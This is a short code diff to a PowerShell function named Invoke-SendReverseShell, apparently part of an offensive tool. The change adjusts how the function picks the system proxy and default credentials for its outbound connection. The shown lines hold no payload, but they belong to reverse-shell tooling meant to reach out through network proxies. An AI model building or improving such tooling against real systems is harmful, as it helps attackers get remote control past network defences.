@@ -68,7 +68,13 @@ function Invoke-SendReverseShell
         $Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         $ProxyName = $Proxy.GetProxy($DestUri).Host
         $ProxyPort = $Proxy.GetProxy($DestUri).Port
-        Write-Verbose "Using system's default proxy [$ProxyName`:$ProxyPort]"
+        if ($ProxyName -eq $DestHost) {
+            $UseProxy = $False
+            Write-Verbose "System's default proxy is not set, not using it"
+        }
+        else {
+            Write-Verbose "Using system's default proxy [$ProxyName`:$ProxyPort]"
+        }       
     }    
 
     if ($UseProxy) {
